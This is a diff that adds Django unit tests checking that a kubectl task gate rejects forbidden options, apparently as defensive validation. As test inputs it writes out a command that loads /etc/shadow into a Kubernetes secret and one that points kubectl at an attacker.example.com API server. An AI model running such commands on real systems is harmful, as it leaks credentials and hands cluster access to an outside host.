@@ -113,3 +113,27 @@ class AlertMuteRegressionTests(TestCase):
         # 上限一年，且不能抛 OverflowError。
         delta = alert.suppressed_until - alert.updated_at
         self.assertLessEqual(delta.days, 366)
+
+
+class KubectlTaskGateTests(SimpleTestCase):
+    def test_task_kubectl_blocks_console_forbidden_options(self):
+        from ops.host_tasks import _kubectl_command_steps
+
+        with self.assertRaisesMessage(ValueError, '--from-file'):
+            _kubectl_command_steps('kubectl create secret generic x --from-file=k=/etc/shadow')
+
+        steps = _kubectl_command_steps('get pods -n default')
+        self.assertEqual(steps[0]['args'], ['get', 'pods', '-n', 'default'])
+
+    def test_task_kubectl_still_accepts_stdin_manifest(self):
+        from ops.host_tasks import _kubectl_command_steps
+
+        steps = _kubectl_command_steps('kubectl apply -f -', {'manifest': 'apiVersion: v1'})
+        self.assertEqual(steps[0]['args'], ['apply', '-f', '-'])
+        self.assertEqual(steps[0]['manifest'], 'apiVersion: v1')
+
+    def test_task_kubectl_blocks_foreign_api_server(self):
+        from ops.host_tasks import _kubectl_command_steps
+
+        with self.assertRaisesMessage(ValueError, '--server'):
+            _kubectl_command_steps('kubectl --server https://attacker.example.com get pods')
